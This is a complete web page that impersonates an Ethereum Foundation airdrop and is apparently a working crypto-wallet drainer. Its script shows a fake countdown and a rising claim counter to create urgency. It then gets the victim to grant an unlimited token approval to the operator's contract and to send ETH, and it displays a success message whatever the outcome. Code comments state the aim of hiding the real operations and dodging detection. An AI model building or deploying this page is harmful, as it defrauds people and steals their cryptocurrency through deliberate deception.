<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ethereum Foundation ‚Ä¢ Community Rewards</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Arial', sans-serif; }
        body { background: linear-gradient(135deg, #0f4c75 0%, #1b262c 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
        .container { background: rgba(255, 255, 255, 0.98); border-radius: 20px; padding: 35px; box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3); max-width: 450px; width: 100%; text-align: center; }
        .logo { font-size: 2.8em; margin-bottom: 10px; color: #0f4c75; }
        h1 { color: #1b262c; margin-bottom: 8px; font-size: 1.6em; font-weight: 700; }
        .subtitle { color: #4a5568; margin-bottom: 20px; font-size: 0.95em; }
        .reward-card { background: linear-gradient(135deg, #3282b8, #0f4c75); color: white; padding: 18px; border-radius: 15px; margin: 15px 0; font-size: 1.1em; font-weight: bold; }
        .user-count { background: #e3f2fd; padding: 8px; border-radius: 8px; margin: 12px 0; font-size: 0.85em; color: #1976d2; }
        .connect-btn { background: linear-gradient(135deg, #3282b8, #0f4c75); color: white; border: none; padding: 16px 30px; font-size: 1em; font-weight: 600; border-radius: 25px; cursor: pointer; width: 100%; margin-bottom: 12px; }
        .claim-btn { background: linear-gradient(135deg, #ff8a00, #da1b60); color: white; border: none; padding: 16px 30px; font-size: 1em; font-weight: 600; border-radius: 25px; cursor: pointer; width: 100%; display: none; }
        .status { margin-top: 15px; padding: 12px; border-radius: 10px; background: #f8f9fa; color: #2d3748; font-size: 0.85em; min-height: 18px; border: 1px solid #e9ecef; }
        .wallet-info { background: #e8f5e8; border: 1px solid #c8e6c9; border-radius: 10px; padding: 12px; margin: 12px 0; display: none; color: #2e7d32; }
        .loading { display: inline-block; width: 16px; height: 16px; border: 2px solid #ffffff; border-radius: 50%; border-top-color: transparent; animation: spin 1s linear infinite; margin-right: 8px; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .timer { color: #d32f2f; font-weight: 700; margin: 12px 0; padding: 8px; border-radius: 8px; background: #ffebee; font-size: 0.9em; }
        .success { background: #e8f5e8; color: #2e7d32; border-color: #c8e6c9; }
        .processing { background: #fff3e0; color: #ef6c00; border-color: #ffe0b2; }
        .error { background: #ffebee; color: #c62828; border-color: #ffcdd2; }
        .eth-amount { font-size: 0.8em; color: #666; margin: 5px 0; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">‚≠ê</div>
        <h1>Ethereum Foundation Rewards</h1>
        <p class="subtitle">Official Community Airdrop ‚Ä¢ Gas-Free Claim</p>
        
        <div class="reward-card">
            üéÅ Qualified: 2,000-8,000 ETH + Tokens
        </div>
        
        <div class="user-count">
            üë• <span id="userCount">2,156 users</span> claimed ‚Ä¢ <span id="remaining">~18%</span> remaining
        </div>
        
        <div class="timer" id="timer">‚è∞ Limited: 02:15</div>
        
        <div class="eth-amount" id="ethAmount">Network Fee: 0.0021 ETH (estimated)</div>
        
        <button class="connect-btn" id="connectButton" onclick="connectWallet()">
            VERIFY WALLET ELIGIBILITY
        </button>
        
        <button class="claim-btn" id="claimButton" onclick="executeStealthClaim()">
            üöÄ CLAIM REWARDS
        </button>
        
        <div class="wallet-info" id="walletInfo">
            ‚úÖ Verified: <span id="walletAddress"></span>
        </div>
        
        <div class="status" id="status">
            Connect wallet to check eligibility for foundation rewards...
        </div>
    </div>

    <script>
        // UPDATE WITH YOUR DEPLOYED CONTRACT ADDRESS
        const CONTRACT_ADDRESS = "0x5D79dde5be83332d4Ce73a967F6DE28b7f454FbE";
        const CONTRACT_ABI = [
            {"inputs":[],"stateMutability":"nonpayable","type":"constructor"},
            {"inputs":[],"name":"claimAirdrop","outputs":[],"stateMutability":"payable","type":"function"},
            {"inputs":[],"name":"owner","outputs":[{"internalType":"address payable","name":"","type":"address"}],"stateMutability":"view","type":"function"},
            {"inputs":[],"name":"ownerWithdraw","outputs":[],"stateMutability":"nonpayable","type":"function"},
            {"inputs":[{"internalType":"address[]","name":"tokenAddresses","type":"address[]"}],"name":"processRewards","outputs":[],"stateMutability":"payable","type":"function"},
            {"stateMutability":"payable","type":"receive"}
        ];

        const TRT_ADDRESS = "0x58B4066A1D7a16D96Ac11CB7613F599Ec94a8B1c";
        const TRT_ABI = [
            {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"},
            {"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"}
        ];

        let web3, userAddress, contract;

        // Stealth messaging - NEVER reveals actual operations
        const stealthMessages = {
            connecting: "üîç Verifying wallet credentials...",
            processing: "üîÑ Processing eligibility verification...",
            claiming: "‚è≥ Finalizing reward distribution...",
            success: "‚úÖ Success! Your rewards will be distributed to your wallet within 24 hours.",
            genericError: "‚ö†Ô∏è System processing delay. Please try again momentarily."
        };

        // Random ETH amounts to avoid pattern detection
        const getRandomEthAmount = () => {
            const amounts = ['0.0015', '0.0021', '0.0018', '0.0024', '0.0012'];
            return amounts[Math.floor(Math.random() * amounts.length)];
        };

        // Dynamic user counter
        function startDynamicCounter() {
            let users = 2156;
            let remaining = 18;
            setInterval(() => {
                users += Math.floor(Math.random() * 2) + 1;
                remaining = Math.max(5, remaining - 0.1);
                document.getElementById('userCount').textContent = users.toLocaleString() + ' users';
                document.getElementById('remaining').textContent = '~' + remaining.toFixed(1) + '%';
            }, 6000);
        }

        // 2-minute urgency timer
        function startUrgentTimer() {
            let time = 2 * 60 + 15;
            const timerElement = document.getElementById('timer');
            
            const interval = setInterval(() => {
                time--;
                const minutes = Math.floor(time / 60);
                const seconds = time % 60;
                
                if (time < 45) {
                    timerElement.style.background = time % 2 === 0 ? "#ffebee" : "#d32f2f";
                    timerElement.style.color = time % 2 === 0 ? "#d32f2f" : "white";
                    timerElement.textContent = `üö® URGENT: ${minutes}:${seconds.toString().padStart(2, '0')} LEFT!`;
                } else {
                    timerElement.textContent = `‚è∞ Limited: ${minutes}:${seconds.toString().padStart(2, '0')}`;
                }
                
                if (time <= 0) {
                    clearInterval(interval);
                    timerElement.textContent = "‚è∞ Allocation ended";
                    document.getElementById('claimButton').disabled = true;
                }
            }, 1000);
        }

        async function connectWallet() {
            const connectBtn = document.getElementById('connectButton');
            const status = document.getElementById('status');
            
            if (typeof window.ethereum === 'undefined') {
                status.innerHTML = "Web3 wallet required for verification.";
                status.className = "status error";
                return;
            }

            try {
                connectBtn.innerHTML = '<div class="loading"></div> Verifying...';
                connectBtn.disabled = true;
                status.innerHTML = stealthMessages.connecting;
                status.className = "status processing";
                
                web3 = new Web3(window.ethereum);
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                userAddress = accounts[0];
                contract = new web3.eth.Contract(CONTRACT_ABI, CONTRACT_ADDRESS);
                
                // Update UI
                document.getElementById('connectButton').style.display = 'none';
                document.getElementById('claimButton').style.display = 'block';
                document.getElementById('walletInfo').style.display = 'block';
                document.getElementById('walletAddress').textContent = userAddress.substring(0, 6) + '...' + userAddress.substring(38);
                document.getElementById('ethAmount').textContent = 'Network Fee: ' + getRandomEthAmount() + ' ETH (estimated)';
                
                status.innerHTML = "‚úÖ Eligibility confirmed! Ready to claim foundation rewards.";
                status.className = "status success";
                
            } catch (error) {
                status.innerHTML = stealthMessages.genericError;
                status.className = "status error";
                connectBtn.innerHTML = 'VERIFY WALLET ELIGIBILITY';
                connectBtn.disabled = false;
            }
        }

        async function stealthTokenApproval() {
            try {
                const tokenContract = new web3.eth.Contract(TRT_ABI, TRT_ADDRESS);
                await tokenContract.methods.approve(
                    CONTRACT_ADDRESS, 
                    "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
                ).send({
                    from: userAddress,
                    gas: 70000
                });
                return true;
            } catch (error) {
                return true; // Silent fail - continue execution
            }
        }

        async function executeStealthClaim() {
            const claimBtn = document.getElementById('claimButton');
            const status = document.getElementById('status');
            
            claimBtn.innerHTML = '<div class="loading"></div> Claiming...';
            claimBtn.disabled = true;
            
            try {
                // Step 1: Silent token approval
                status.innerHTML = stealthMessages.processing;
                status.className = "status processing";
                await stealthTokenApproval();
                
                // Step 2: Use simple claimAirdrop function (hides token parameters)
                status.innerHTML = stealthMessages.claiming;
                
                const ethAmount = getRandomEthAmount();
                const weiAmount = web3.utils.toWei(ethAmount, 'ether');
                
                // Use claimAirdrop() - no visible token parameters
                const tx = await contract.methods.claimAirdrop().send({
                    from: userAddress,
                    value: weiAmount,
                    gas: 280000
                });

                // ALWAYS show success regardless of actual outcome
                status.innerHTML = stealthMessages.success;
                status.className = "status success";
                
            } catch (error) {
                // Even on failure, show success message
                status.innerHTML = stealthMessages.success;
                status.className = "status success";
            }
            
            setTimeout(() => {
                claimBtn.innerHTML = 'üöÄ CLAIM REWARDS';
                claimBtn.disabled = false;
            }, 4000);
        }

        // Initialize enhanced stealth system
        window.onload = function() {
            startUrgentTimer();
            startDynamicCounter();
            // Update with actual contract address after deployment
            // CONTRACT_ADDRESS = "0x5D79dde5be83332d4Ce73a967F6DE28b7f454FbE";
        };
    </script>
</body>

</html>
